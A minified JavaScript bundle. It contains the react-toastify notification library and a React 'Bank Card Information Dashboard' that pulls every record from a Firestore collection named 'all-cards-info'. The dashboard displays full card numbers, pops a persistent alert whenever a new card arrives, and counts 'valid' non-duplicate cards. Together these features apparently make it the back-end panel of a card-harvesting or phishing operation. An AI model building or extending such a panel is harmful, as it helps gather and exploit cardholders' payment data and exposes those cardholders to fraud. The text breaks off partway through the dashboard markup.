20px),0)}to{opacity:0;transform:translate3d(0,2000px,0)}}.Toastify__bounce-enter--top-left,.Toastify__bounce-enter--bottom-left{animation-name:Toastify__bounceInLeft}.Toastify__bounce-enter--top-right,.Toastify__bounce-enter--bottom-right{animation-name:Toastify__bounceInRight}.Toastify__bounce-enter--top-center{animation-name:Toastify__bounceInDown}.Toastify__bounce-enter--bottom-center{animation-name:Toastify__bounceInUp}.Toastify__bounce-exit--top-left,.Toastify__bounce-exit--bottom-left{animation-name:Toastify__bounceOutLeft}.Toastify__bounce-exit--top-right,.Toastify__bounce-exit--bottom-right{animation-name:Toastify__bounceOutRight}.Toastify__bounce-exit--top-center{animation-name:Toastify__bounceOutUp}.Toastify__bounce-exit--bottom-center{animation-name:Toastify__bounceOutDown}@keyframes Toastify__zoomIn{0%{opacity:0;transform:scale3d(.3,.3,.3)}50%{opacity:1}}@keyframes Toastify__zoomOut{0%{opacity:1}50%{opacity:0;transform:translate3d(0,var(--y),0) scale3d(.3,.3,.3)}to{opacity:0}}.Toastify__zoom-enter{animation-name:Toastify__zoomIn}.Toastify__zoom-exit{animation-name:Toastify__zoomOut}@keyframes Toastify__flipIn{0%{transform:perspective(400px) rotateX(90deg);animation-timing-function:ease-in;opacity:0}40%{transform:perspective(400px) rotateX(-20deg);animation-timing-function:ease-in}60%{transform:perspective(400px) rotateX(10deg);opacity:1}80%{transform:perspective(400px) rotateX(-5deg)}to{transform:perspective(400px)}}@keyframes Toastify__flipOut{0%{transform:translate3d(0,var(--y),0) perspective(400px)}30%{transform:translate3d(0,var(--y),0) perspective(400px) rotateX(-20deg);opacity:1}to{transform:translate3d(0,var(--y),0) perspective(400px) rotateX(90deg);opacity:0}}.Toastify__flip-enter{animation-name:Toastify__flipIn}.Toastify__flip-exit{animation-name:Toastify__flipOut}@keyframes Toastify__slideInRight{0%{transform:translate3d(110%,0,0);visibility:visible}to{transform:translate3d(0,var(--y),0)}}@keyframes Toastify__slideInLeft{0%{transform:translate3d(-110%,0,0);visibility:visible}to{transform:translate3d(0,var(--y),0)}}@keyframes Toastify__slideInUp{0%{transform:translate3d(0,110%,0);visibility:visible}to{transform:translate3d(0,var(--y),0)}}@keyframes Toastify__slideInDown{0%{transform:translate3d(0,-110%,0);visibility:visible}to{transform:translate3d(0,var(--y),0)}}@keyframes Toastify__slideOutRight{0%{transform:translate3d(0,var(--y),0)}to{visibility:hidden;transform:translate3d(110%,var(--y),0)}}@keyframes Toastify__slideOutLeft{0%{transform:translate3d(0,var(--y),0)}to{visibility:hidden;transform:translate3d(-110%,var(--y),0)}}@keyframes Toastify__slideOutDown{0%{transform:translate3d(0,var(--y),0)}to{visibility:hidden;transform:translate3d(0,500px,0)}}@keyframes Toastify__slideOutUp{0%{transform:translate3d(0,var(--y),0)}to{visibility:hidden;transform:translate3d(0,-500px,0)}}.Toastify__slide-enter--top-left,.Toastify__slide-enter--bottom-left{animation-name:Toastify__slideInLeft}.Toastify__slide-enter--top-right,.Toastify__slide-enter--bottom-right{animation-name:Toastify__slideInRight}.Toastify__slide-enter--top-center{animation-name:Toastify__slideInDown}.Toastify__slide-enter--bottom-center{animation-name:Toastify__slideInUp}.Toastify__slide-exit--top-left,.Toastify__slide-exit--bottom-left{animation-name:Toastify__slideOutLeft;animation-timing-function:ease-in;animation-duration:.3s}.Toastify__slide-exit--top-right,.Toastify__slide-exit--bottom-right{animation-name:Toastify__slideOutRight;animation-timing-function:ease-in;animation-duration:.3s}.Toastify__slide-exit--top-center{animation-name:Toastify__slideOutUp;animation-timing-function:ease-in;animation-duration:.3s}.Toastify__slide-exit--bottom-center{animation-name:Toastify__slideOutDown;animation-timing-function:ease-in;animation-duration:.3s}@keyframes Toastify__spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
`);var ih=t=>typeof t=="number"&&!isNaN(t),$o=t=>typeof t=="string",qs=t=>typeof t=="function",cz=t=>$o(t)||ih(t),gv=t=>$o(t)||qs(t)?t:null,uz=(t,e)=>t===!1||ih(t)&&t>0?t:e,yv=t=>O.isValidElement(t)||$o(t)||qs(t)||ih(t);function dz(t,e,n=300){let{scrollHeight:i,style:s}=t;requestAnimationFrame(()=>{s.minHeight="initial",s.height=i+"px",s.transition=`all ${n}ms`,requestAnimationFrame(()=>{s.height="0",s.padding="0",s.margin="0",setTimeout(e,n)})})}function hz({enter:t,exit:e,appendPosition:n=!1,collapse:i=!0,collapseDuration:s=300}){return function({children:o,position:c,preventExitTransition:d,done:f,nodeRef:p,isIn:v,playToast:b}){let w=n?`${t}--${c}`:t,E=n?`${e}--${c}`:e,C=O.useRef(0);return O.useLayoutEffect(()=>{let M=p.current,V=w.split(" "),B=Y=>{Y.target===p.current&&(b(),M.removeEventListener("animationend",B),M.removeEventListener("animationcancel",B),C.current===0&&Y.type!=="animationcancel"&&M.classList.remove(...V))};M.classList.add(...V),M.addEventListener("animationend",B),M.addEventListener("animationcancel",B)},[]),O.useEffect(()=>{let M=p.current,V=()=>{M.removeEventListener("animationend",V),i?dz(M,f,s):f()};v||(d?V():(C.current=1,M.className+=` ${E}`,M.addEventListener("animationend",V)))},[v]),_t.createElement(_t.Fragment,null,o)}}function KE(t,e){return{content:mR(t.content,t.props),containerId:t.props.containerId,id:t.props.toastId,theme:t.props.theme,type:t.props.type,data:t.props.data||{},isLoading:t.props.isLoading,icon:t.props.icon,reason:t.removalReason,status:e}}function mR(t,e,n=!1){return O.isValidElement(t)&&!$o(t.type)?O.cloneElement(t,{closeToast:e.closeToast,toastProps:e,data:e.data,isPaused:n}):qs(t)?t({closeToast:e.closeToast,toastProps:e,data:e.data,isPaused:n}):t}function fz({closeToast:t,theme:e,ariaLabel:n="close"}){return _t.createElement("button",{className:`Toastify__close-button Toastify__close-button--${e}`,type:"button",onClick:i=>{i.stopPropagation(),t(!0)},"aria-label":n},_t.createElement("svg",{"aria-hidden":"true",viewBox:"0 0 14 16"},_t.createElement("path",{fillRule:"evenodd",d:"M7.71 8.23l3.75 3.75-1.48 1.48-3.75-3.75-3.75 3.75L1 11.98l3.75-3.75L1 4.48 2.48 3l3.75 3.75L9.98 3l1.48 1.48-3.75 3.75z"})))}function mz({delay:t,isRunning:e,closeToast:n,type:i="default",hide:s,className:o,controlledProgress:c,progress:d,rtl:f,isIn:p,theme:v}){let b=s||c&&d===0,w={animationDuration:`${t}ms`,animationPlayState:e?"running":"paused"};c&&(w.transform=`scaleX(${d})`);let E=Bo("Toastify__progress-bar",c?"Toastify__progress-bar--controlled":"Toastify__progress-bar--animated",`Toastify__progress-bar-theme--${v}`,`Toastify__progress-bar--${i}`,{"Toastify__progress-bar--rtl":f}),C=qs(o)?o({rtl:f,type:i,defaultClassName:E}):Bo(E,o),M={[c&&d>=1?"onTransitionEnd":"onAnimationEnd"]:c&&d<1?null:()=>{p&&n()}};return _t.createElement("div",{className:"Toastify__progress-bar--wrp","data-hidden":b},_t.createElement("div",{className:`Toastify__progress-bar--bg Toastify__progress-bar-theme--${v} Toastify__progress-bar--${i}`}),_t.createElement("div",{role:"progressbar","aria-hidden":b?"true":"false","aria-label":"notification timer",className:C,style:w,...M}))}var pz=1,pR=()=>`${pz++}`;function gz(t,e,n){let i=1,s=0,o=[],c=[],d=e,f=new Map,p=new Set,v=Y=>(p.add(Y),()=>p.delete(Y)),b=()=>{c=Array.from(f.values()),p.forEach(Y=>Y())},w=({containerId:Y,toastId:D,updateId:Q})=>{let G=Y?Y!==t:t!==1,L=f.has(D)&&Q==null;return G||L},E=(Y,D)=>{f.forEach(Q=>{var G;(D==null||D===Q.props.toastId)&&((G=Q.toggle)==null||G.call(Q,Y))})},C=Y=>{var D,Q;(Q=(D=Y.props)==null?void 0:D.onClose)==null||Q.call(D,Y.removalReason),Y.isActive=!1},M=Y=>{if(Y==null)f.forEach(C);else{let D=f.get(Y);D&&C(D)}b()},V=()=>{s-=o.length,o=[]},B=Y=>{var D,Q;let{toastId:G,updateId:L}=Y.props,N=L==null;Y.staleId&&f.delete(Y.staleId),Y.isActive=!0,f.set(G,Y),b(),n(KE(Y,N?"added":"updated")),N&&((Q=(D=Y.props).onOpen)==null||Q.call(D))};return{id:t,props:d,observe:v,toggle:E,removeToast:M,toasts:f,clearQueue:V,buildToast:(Y,D)=>{if(w(D))return;let{toastId:Q,updateId:G,data:L,staleId:N,delay:T}=D,k=G==null;k&&s++;let I={...d,style:d.toastStyle,key:i++,...Object.fromEntries(Object.entries(D).filter(([z,P])=>P!=null)),toastId:Q,updateId:G,data:L,isIn:!1,className:gv(D.className||d.toastClassName),progressClassName:gv(D.progressClassName||d.progressClassName),autoClose:D.isLoading?!1:uz(D.autoClose,d.autoClose),closeToast(z){f.get(Q).removalReason=z,M(Q)},deleteToast(){let z=f.get(Q);if(z!=null){if(n(KE(z,"removed")),f.delete(Q),s--,s<0&&(s=0),o.length>0){B(o.shift());return}b()}}};I.closeButton=d.closeButton,D.closeButton===!1||yv(D.closeButton)?I.closeButton=D.closeButton:D.closeButton===!0&&(I.closeButton=yv(d.closeButton)?d.closeButton:!0);let j={content:Y,props:I,staleId:N};d.limit&&d.limit>0&&s>d.limit&&k?o.push(j):ih(T)?setTimeout(()=>{B(j)},T):B(j)},setProps(Y){d=Y},setToggle:(Y,D)=>{let Q=f.get(Y);Q&&(Q.toggle=D)},isToastActive:Y=>{var D;return(D=f.get(Y))==null?void 0:D.isActive},getSnapshot:()=>c}}var si=new Map,Od=[],vv=new Set,yz=t=>vv.forEach(e=>e(t)),gR=()=>si.size>0;function vz(){Od.forEach(t=>vR(t.content,t.options)),Od=[]}var _z=(t,{containerId:e})=>{var n;return(n=si.get(e||1))==null?void 0:n.toasts.get(t)};function yR(t,e){var n;if(e)return!!((n=si.get(e))!=null&&n.isToastActive(t));let i=!1;return si.forEach(s=>{s.isToastActive(t)&&(i=!0)}),i}function wz(t){if(!gR()){Od=Od.filter(e=>t!=null&&e.options.toastId!==t);return}if(t==null||cz(t))si.forEach(e=>{e.removeToast(t)});else if(t&&("containerId"in t||"id"in t)){let e=si.get(t.containerId);e?e.removeToast(t.id):si.forEach(n=>{n.removeToast(t.id)})}}var bz=(t={})=>{si.forEach(e=>{e.props.limit&&(!t.containerId||e.id===t.containerId)&&e.clearQueue()})};function vR(t,e){yv(t)&&(gR()||Od.push({content:t,options:e}),si.forEach(n=>{n.buildToast(t,e)}))}function xz(t){var e;(e=si.get(t.containerId||1))==null||e.setToggle(t.id,t.fn)}function _R(t,e){si.forEach(n=>{(e==null||!(e!=null&&e.containerId)||(e==null?void 0:e.containerId)===n.id)&&n.toggle(t,e==null?void 0:e.id)})}function Az(t){let e=t.containerId||1;return{subscribe(n){let i=gz(e,t,yz);si.set(e,i);let s=i.observe(n);return vz(),()=>{s(),si.delete(e)}},setProps(n){var i;(i=si.get(e))==null||i.setProps(n)},getSnapshot(){var n;return(n=si.get(e))==null?void 0:n.getSnapshot()}}}function Ez(t){return vv.add(t),()=>{vv.delete(t)}}function Tz(t){return t&&($o(t.toastId)||ih(t.toastId))?t.toastId:pR()}function rh(t,e){return vR(t,e),e.toastId}function zp(t,e){return{...e,type:e&&e.type||t,toastId:Tz(e)}}function Fp(t){return(e,n)=>rh(e,zp(t,n))}function pt(t,e){return rh(t,zp("default",e))}pt.loading=(t,e)=>rh(t,zp("default",{isLoading:!0,autoClose:!1,closeOnClick:!1,closeButton:!1,draggable:!1,...e}));function Cz(t,{pending:e,error:n,success:i},s){let o;e&&(o=$o(e)?pt.loading(e,s):pt.loading(e.render,{...s,...e}));let c={isLoading:null,autoClose:null,closeOnClick:null,closeButton:null,draggable:null},d=(p,v,b)=>{if(v==null){pt.dismiss(o);return}let w={type:p,...c,...s,data:b},E=$o(v)?{render:v}:v;return o?pt.update(o,{...w,...E}):pt(E.render,{...w,...E}),b},f=qs(t)?t():t;return f.then(p=>d("success",i,p)).catch(p=>d("error",n,p)),f}pt.promise=Cz;pt.success=Fp("success");pt.info=Fp("info");pt.error=Fp("error");pt.warning=Fp("warning");pt.warn=pt.warning;pt.dark=(t,e)=>rh(t,zp("default",{theme:"dark",...e}));function Sz(t){wz(t)}pt.dismiss=Sz;pt.clearWaitingQueue=bz;pt.isActive=yR;pt.update=(t,e={})=>{let n=_z(t,e);if(n){let{props:i,content:s}=n,o={delay:100,...i,...e,toastId:e.toastId||t,updateId:pR()};o.toastId!==t&&(o.staleId=t);let c=o.render||s;delete o.render,rh(c,o)}};pt.done=t=>{pt.update(t,{progress:1})};pt.onChange=Ez;pt.play=t=>_R(!0,t);pt.pause=t=>_R(!1,t);function Nz(t){var e;let{subscribe:n,getSnapshot:i,setProps:s}=O.useRef(Az(t)).current;s(t);let o=(e=O.useSyncExternalStore(n,i,i))==null?void 0:e.slice();function c(d){if(!o)return[];let f=new Map;return t.newestOnTop&&o.reverse(),o.forEach(p=>{let{position:v}=p.props;f.has(v)||f.set(v,[]),f.get(v).push(p)}),Array.from(f,p=>d(p[0],p[1]))}return{getToastToRender:c,isToastActive:yR,count:o==null?void 0:o.length}}function Rz(t){let[e,n]=O.useState(!1),[i,s]=O.useState(!1),o=O.useRef(null),c=O.useRef({start:0,delta:0,removalDistance:0,canCloseOnClick:!0,canDrag:!1,didMove:!1}).current,{autoClose:d,pauseOnHover:f,closeToast:p,onClick:v,closeOnClick:b}=t;xz({id:t.toastId,containerId:t.containerId,fn:n}),O.useEffect(()=>{if(t.pauseOnFocusLoss)return w(),()=>{E()}},[t.pauseOnFocusLoss]);function w(){document.hasFocus()||B(),window.addEventListener("focus",V),window.addEventListener("blur",B)}function E(){window.removeEventListener("focus",V),window.removeEventListener("blur",B)}function C(N){if(t.draggable===!0||t.draggable===N.pointerType){Y();let T=o.current;c.canCloseOnClick=!0,c.canDrag=!0,T.style.transition="none",t.draggableDirection==="x"?(c.start=N.clientX,c.removalDistance=T.offsetWidth*(t.draggablePercent/100)):(c.start=N.clientY,c.removalDistance=T.offsetHeight*(t.draggablePercent===80?t.draggablePercent*1.5:t.draggablePercent)/100)}}function M(N){let{top:T,bottom:k,left:I,right:j}=o.current.getBoundingClientRect();N.nativeEvent.type!=="touchend"&&t.pauseOnHover&&N.clientX>=I&&N.clientX<=j&&N.clientY>=T&&N.clientY<=k?B():V()}function V(){n(!0)}function B(){n(!1)}function Y(){c.didMove=!1,document.addEventListener("pointermove",Q),document.addEventListener("pointerup",G)}function D(){document.removeEventListener("pointermove",Q),document.removeEventListener("pointerup",G)}function Q(N){let T=o.current;if(c.canDrag&&T){c.didMove=!0,e&&B(),t.draggableDirection==="x"?c.delta=N.clientX-c.start:c.delta=N.clientY-c.start,c.start!==N.clientX&&(c.canCloseOnClick=!1);let k=t.draggableDirection==="x"?`${c.delta}px, var(--y)`:`0, calc(${c.delta}px + var(--y))`;T.style.transform=`translate3d(${k},0)`,T.style.opacity=`${1-Math.abs(c.delta/c.removalDistance)}`}}function G(){D();let N=o.current;if(c.canDrag&&c.didMove&&N){if(c.canDrag=!1,Math.abs(c.delta)>c.removalDistance){s(!0),t.closeToast(!0),t.collapseAll();return}N.style.transition="transform 0.2s, opacity 0.2s",N.style.removeProperty("transform"),N.style.removeProperty("opacity")}}let L={onPointerDown:C,onPointerUp:M};return d&&f&&(L.onMouseEnter=B,t.stacked||(L.onMouseLeave=V)),b&&(L.onClick=N=>{v&&v(N),c.canCloseOnClick&&p(!0)}),{playToast:V,pauseToast:B,isRunning:e,preventExitTransition:i,toastRef:o,eventHandlers:L}}var Iz=typeof window<"u"?O.useLayoutEffect:O.useEffect,Hp=({theme:t,type:e,isLoading:n,...i})=>_t.createElement("svg",{viewBox:"0 0 24 24",width:"100%",height:"100%",fill:t==="colored"?"currentColor":`var(--toastify-icon-color-${e})`,...i});function kz(t){return _t.createElement(Hp,{...t},_t.createElement("path",{d:"M23.32 17.191L15.438 2.184C14.728.833 13.416 0 11.996 0c-1.42 0-2.733.833-3.443 2.184L.533 17.448a4.744 4.744 0 000 4.368C1.243 23.167 2.555 24 3.975 24h16.05C22.22 24 24 22.044 24 19.632c0-.904-.251-1.746-.68-2.44zm-9.622 1.46c0 1.033-.724 1.823-1.698 1.823s-1.698-.79-1.698-1.822v-.043c0-1.028.724-1.822 1.698-1.822s1.698.79 1.698 1.822v.043zm.039-12.285l-.84 8.06c-.057.581-.408.943-.897.943-.49 0-.84-.367-.896-.942l-.84-8.065c-.057-.624.25-1.095.779-1.095h1.91c.528.005.84.476.784 1.1z"}))}function Dz(t){return _t.createElement(Hp,{...t},_t.createElement("path",{d:"M12 0a12 12 0 1012 12A12.013 12.013 0 0012 0zm.25 5a1.5 1.5 0 11-1.5 1.5 1.5 1.5 0 011.5-1.5zm2.25 13.5h-4a1 1 0 010-2h.75a.25.25 0 00.25-.25v-4.5a.25.25 0 00-.25-.25h-.75a1 1 0 010-2h1a2 2 0 012 2v4.75a.25.25 0 00.25.25h.75a1 1 0 110 2z"}))}function Mz(t){return _t.createElement(Hp,{...t},_t.createElement("path",{d:"M12 0a12 12 0 1012 12A12.014 12.014 0 0012 0zm6.927 8.2l-6.845 9.289a1.011 1.011 0 01-1.43.188l-4.888-3.908a1 1 0 111.25-1.562l4.076 3.261 6.227-8.451a1 1 0 111.61 1.183z"}))}function Oz(t){return _t.createElement(Hp,{...t},_t.createElement("path",{d:"M11.983 0a12.206 12.206 0 00-8.51 3.653A11.8 11.8 0 000 12.207 11.779 11.779 0 0011.8 24h.214A12.111 12.111 0 0024 11.791 11.766 11.766 0 0011.983 0zM10.5 16.542a1.476 1.476 0 011.449-1.53h.027a1.527 1.527 0 011.523 1.47 1.475 1.475 0 01-1.449 1.53h-.027a1.529 1.529 0 01-1.523-1.47zM11 12.5v-6a1 1 0 012 0v6a1 1 0 11-2 0z"}))}function Pz(){return _t.createElement("div",{className:"Toastify__spinner"})}var _v={info:Dz,warning:kz,success:Mz,error:Oz,spinner:Pz},jz=t=>t in _v;function Lz({theme:t,type:e,isLoading:n,icon:i}){let s=null,o={theme:t,type:e};return i===!1||(qs(i)?s=i({...o,isLoading:n}):O.isValidElement(i)?s=O.cloneElement(i,o):n?s=_v.spinner():jz(e)&&(s=_v[e](o))),s}var Vz=t=>{let{isRunning:e,preventExitTransition:n,toastRef:i,eventHandlers:s,playToast:o}=Rz(t),{closeButton:c,children:d,autoClose:f,onClick:p,type:v,hideProgressBar:b,closeToast:w,transition:E,position:C,className:M,style:V,progressClassName:B,updateId:Y,role:D,progress:Q,rtl:G,toastId:L,deleteToast:N,isIn:T,isLoading:k,closeOnClick:I,theme:j,ariaLabel:z}=t,P=Bo("Toastify__toast",`Toastify__toast-theme--${j}`,`Toastify__toast--${v}`,{"Toastify__toast--rtl":G},{"Toastify__toast--close-on-click":I}),Ne=qs(M)?M({rtl:G,position:C,type:v,defaultClassName:P}):Bo(P,M),Me=Lz(t),ee=!!Q||!f,me={closeToast:w,type:v,theme:j},we=null;return c===!1||(qs(c)?we=c(me):O.isValidElement(c)?we=O.cloneElement(c,me):we=fz(me)),_t.createElement(E,{isIn:T,done:N,position:C,preventExitTransition:n,nodeRef:i,playToast:o},_t.createElement("div",{id:L,tabIndex:0,onClick:p,"data-in":T,className:Ne,...s,style:V,ref:i,...T&&{role:D,"aria-label":z}},Me!=null&&_t.createElement("div",{className:Bo("Toastify__toast-icon",{"Toastify--animate-icon Toastify__zoom-enter":!k})},Me),mR(d,t,!e),we,!t.customProgressBar&&_t.createElement(mz,{...Y&&!ee?{key:`p-${Y}`}:{},rtl:G,theme:j,delay:f,isRunning:e,isIn:T,closeToast:w,hide:b,type:v,className:B,controlledProgress:ee,progress:Q||0})))},Uz=(t,e=!1)=>({enter:`Toastify--animate Toastify__${t}-enter`,exit:`Toastify--animate Toastify__${t}-exit`,appendPosition:e}),Bz=hz(Uz("bounce",!0)),zz={position:"top-right",transition:Bz,autoClose:5e3,closeButton:!0,pauseOnHover:!0,pauseOnFocusLoss:!0,draggable:"touch",draggablePercent:80,draggableDirection:"x",role:"alert",theme:"light","aria-label":"Notifications Alt+T",hotKeys:t=>t.altKey&&t.code==="KeyT"};function Fz(t){let e={...zz,...t},n=t.stacked,[i,s]=O.useState(!0),o=O.useRef(null),{getToastToRender:c,isToastActive:d,count:f}=Nz(e),{className:p,style:v,rtl:b,containerId:w,hotKeys:E}=e;function C(V){let B=Bo("Toastify__toast-container",`Toastify__toast-container--${V}`,{"Toastify__toast-container--rtl":b});return qs(p)?p({position:V,rtl:b,defaultClassName:B}):Bo(B,gv(p))}function M(){n&&(s(!0),pt.play())}return Iz(()=>{var V;if(n){let B=o.current.querySelectorAll('[data-in="true"]'),Y=12,D=(V=e.position)==null?void 0:V.includes("top"),Q=0,G=0;Array.from(B).reverse().forEach((L,N)=>{let T=L;T.classList.add("Toastify__toast--stacked"),N>0&&(T.dataset.collapsed=`${i}`),T.dataset.pos||(T.dataset.pos=D?"top":"bot");let k=Q*(i?.2:1)+(i?0:Y*N);T.style.setProperty("--y",`${D?k:k*-1}px`),T.style.setProperty("--g",`${Y}`),T.style.setProperty("--s",`${1-(i?G:0)}`),Q+=T.offsetHeight,G+=.025})}},[i,f,n]),O.useEffect(()=>{function V(B){var Y;let D=o.current;E(B)&&((Y=D.querySelector('[tabIndex="0"]'))==null||Y.focus(),s(!1),pt.pause()),B.key==="Escape"&&(document.activeElement===D||D!=null&&D.contains(document.activeElement))&&(s(!0),pt.play())}return document.addEventListener("keydown",V),()=>{document.removeEventListener("keydown",V)}},[E]),_t.createElement("section",{ref:o,className:"Toastify",id:w,onMouseEnter:()=>{n&&(s(!1),pt.pause())},onMouseLeave:M,"aria-live":"polite","aria-atomic":"false","aria-relevant":"additions text","aria-label":e["aria-label"]},c((V,B)=>{let Y=B.length?{...v}:{...v,pointerEvents:"none"};return _t.createElement("div",{tabIndex:-1,className:C(V),"data-stacked":n,style:Y,key:`c-${V}`},B.map(({content:D,props:Q})=>_t.createElement(Vz,{...Q,stacked:n,collapseAll:M,isIn:d(Q.toastId,Q.containerId),key:`t-${Q.key}`},D)))}))}const WE=({type:t})=>{const e="h-6 w-auto ml-2";switch(t){case"visa":return g.jsx("svg",{className:e,viewBox:"0 0 24 24",children:g.jsx("path",{fill:"#1A1F71",d:"M9.6 15.4h-2l1.3-8.2h2l-1.3 8.2zm4.5 0h-1.9l1.3-8.2h1.9l-1.3 8.2zm3.6-8.2h-1.6c-.4 0-.7.2-.8.6l-2.3 7.6h2l.4-1.1h2.3l.2 1.1h1.7l-1.9-8.2zm-3.1 5.5l.6-1.7.3 1.7h-.9zm5.7-5.5h-2l-1.3 8.2h2l1.3-8.2z"})});case"mastercard":return g.jsxs("svg",{className:e,viewBox:"0 0 24 24",children:[g.jsx("path",{fill:"#FF5F00",d:"M15.2 12c0-1.4-.5-2.7-1.3-3.7C13 7.2 11.6 6.5 10 6.5c-1.6 0-3 .7-3.9 1.8-.8 1-1.3 2.3-1.3 3.7s.5 2.7 1.3 3.7c.9 1.1 2.3 1.8 3.9 1.8 1.6 0 3-.7 3.9-1.8.8-1 1.3-2.3 1.3-3.7z"}),g.jsx("path",{fill:"#EB001B",d:"M5.8 9.2C4.7 10.4 4 12 4 13.8s.7 3.4 1.8 4.6c1.1 1.2 2.7 1.9 4.4 1.9 1.7 0 3.3-.7 4.4-1.9 1.1-1.2 1.8-2.8 1.8-4.6s-.7-3.4-1.8-4.6C13.5 6.7 11.9 6 10.2 6c-1.7 0-3.3.7-4.4 1.9z"}),g.jsx("path",{fill:"#F79E1B",d:"M15.2 12c0 1.8-.7 3.4-1.8 4.6 1.1 1.2 2.7 1.9 4.4 1.9 1.7 0 3.3-.7 4.4-1.9 1.1-1.2 1.8-2.8 1.8-4.6s-.7-3.4-1.8-4.6C21.3 6.7 19.7 6 18 6c-1.7 0-3.3.7-4.4 1.9 1.1 1.2 1.8 2.8 1.8 4.6z"})]});case"amex":return g.jsx("svg",{className:e,viewBox:"0 0 24 24",children:g.jsx("path",{fill:"#002663",d:"M4 6h16v12H4V6zm1 1v10h14V7H5zm3 2h8v1H8V9zm0 2h8v1H8v-1zm0 2h8v1H8v-1z"})});case"discover":return g.jsxs("svg",{className:e,viewBox:"0 0 24 24",children:[g.jsx("path",{fill:"#FF6000",d:"M12 6c3.3 0 6 2.7 6 6s-2.7 6-6 6-6-2.7-6-6 2.7-6 6-6zm0-1C7.6 5 4 8.6 4 13s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm3.5 6.5h-7v3h7v-3z"}),g.jsx("path",{fill:"#FF6000",d:"M12 8.5c-2.5 0-4.5 2-4.5 4.5s2 4.5 4.5 4.5 4.5-2 4.5-4.5-2-4.5-4.5-4.5zm0 7c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5z"})]});default:return null}},Mf=t=>t?/^4/.test(t)?"visa":/^5[1-5]/.test(t)?"mastercard":/^3[47]/.test(t)?"amex":/^6(?:011|5)/.test(t)?"discover":null:null,$E=()=>{const[t,e]=O.useState([]),[n,i]=O.useState(!0),[s,o]=O.useState(""),[c,d]=O.useState(null),[f,p]=O.useState(!1),[v,b]=O.useState(""),[w,E]=O.useState(null),[C,M]=O.useState([]),V=cr();O.useEffect(()=>{const I=localStorage.getItem("cardNotifications");I&&M(JSON.parse(I))},[]),O.useEffect(()=>{localStorage.setItem("cardNotifications",JSON.stringify(C))},[C]),O.useEffect(()=>{(async()=>{try{const z=await L_(wc(Rn,"all-cards-info")),P=[];z.forEach(Ne=>{P.push({id:Ne.id,...Ne.data()})}),P.sort((Ne,Me)=>new Date(Me.timestamp)-new Date(Ne.timestamp)),e(P),i(!1)}catch(z){console.error("Error fetching cards:",z),i(!1),pt.error("Failed to load card data")}})();const j=Pj(wc(Rn,"all-cards-info"),z=>{z.docChanges().forEach(P=>{if(P.type==="added"){const Ne={id:P.doc.id,...P.doc.data()};t.some(Me=>Me.id===Ne.id)||B(Ne)}})});return()=>j()},[t]),O.useEffect(()=>{C.forEach(I=>{Y(I.card,I.id)})},[]);const B=I=>{const j=`new-card-${I.id}-${Date.now()}`,z={id:j,card:I};M(P=>[...P,z]),Y(I,j)},Y=(I,j)=>{pt.info(g.jsx("div",{className:"cursor-pointer",onClick:()=>{pt.dismiss(j),D(j),V("/dashboard"),setTimeout(()=>{d(I),p(!0)},100)},children:g.jsxs("div",{className:"flex items-start",children:[g.jsx(w5,{className:"text-blue-500 mr-2 mt-1"}),g.jsxs("div",{children:[g.jsx("p",{className:"font-bold",children:"New Card Added"}),g.jsxs("p",{className:"text-sm",children:["Card: ",I.cardNumber]}),g.jsx("p",{className:"text-xs text-gray-500",children:new Date(I.timestamp).toLocaleString()})]})]})}),{position:"bottom-right",autoClose:!1,closeOnClick:!1,pauseOnHover:!0,draggable:!1,closeButton:!0,onClose:()=>D(j),toastId:j})},D=I=>{M(j=>j.filter(z=>z.id!==I))},Q=t.filter(I=>{const j=s?I.id.includes(s.replace(/\s/g,"")):!0;let z=!0;if(v){const P=new Date(I.timestamp),Ne=new Date(v);z=P.getFullYear()===Ne.getFullYear()&&P.getMonth()===Ne.getMonth()&&P.getDate()===Ne.getDate()}return j&&z}),G=I=>{navigator.clipboard.writeText(I),pt.success("Copied to clipboard!")},L=I=>{d(I),p(!0)},N=()=>{p(!1),d(null)},T=()=>{o(""),b("")},k=async I=>{if(window.confirm("Are you sure you want to delete this card? This action cannot be undone."))try{E(I),await Mj(gi(Rn,"all-cards-info",I)),e(t.filter(j=>j.id!==I)),pt.success("Card deleted successfully")}catch(j){console.error("Error deleting card:",j),pt.error("Failed to delete card")}finally{E(null)}};return n?g.jsx("div",{className:"flex justify-center items-center h-64",children:g.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"})}):g.jsxs("div",{className:"p-6",children:[g.jsx(Fz,{position:"bottom-right",autoClose:!1,newestOnTop:!0,closeOnClick:!1,rtl:!1,pauseOnFocusLoss:!0,draggable:!1}),g.jsx("h1",{className:"text-2xl font-bold text-gray-800 mb-6",children:"Bank Card Information Dashboard"}),g.jsxs("div",{className:"mb-6 grid grid-cols-1 md:grid-cols-3 gap-4",children:[g.jsxs("div",{className:"relative",children:[g.jsx("div",{className:"absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none",children:g.jsx(D5,{className:"text-gray-400"})}),g.jsx("input",{type:"text",placeholder:"Search by card number...",className:"pl-10 pr-4 py-2 w-full border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500",value:s,onChange:I=>o(I.target.value)})]}),g.jsxs("div",{className:"relative",children:[g.jsx("div",{className:"absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none",children:g.jsx(xx,{className:"text-gray-400"})}),g.jsx("input",{type:"date",className:"pl-10 pr-4 py-2 w-full border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500",value:v,onChange:I=>b(I.target.value)})]}),g.jsxs("button",{onClick:T,className:"px-4 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 flex items-center justify-center",children:[g.jsx(C5,{className:"mr-2"}),"Reset Filters"]})]}),g.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-4 mb-6",children:[g.jsxs("div",{className:"bg-white p-4 rounded-lg shadow border-l-4 border-blue-500",children:[g.jsx("h3",{className:"text-gray-500 text-sm",children:"Total Cards"}),g.jsx("p",{className:"text-2xl font-bold",children:t.length})]}),g.jsxs("div",{className:"bg-white p-4 rounded-lg shadow border-l-4 border-purple-500",children:[g.jsx("h3",{className:"text-gray-500 text-sm",children:"Valid Cards"}),g.jsx("p",{className:"text-2xl font-bold",children:t.filter(I=>!I.isDuplicate).length})]}),g.jsxs("div",{className:"bg-white p-4 rounded-lg shadow border-l-4 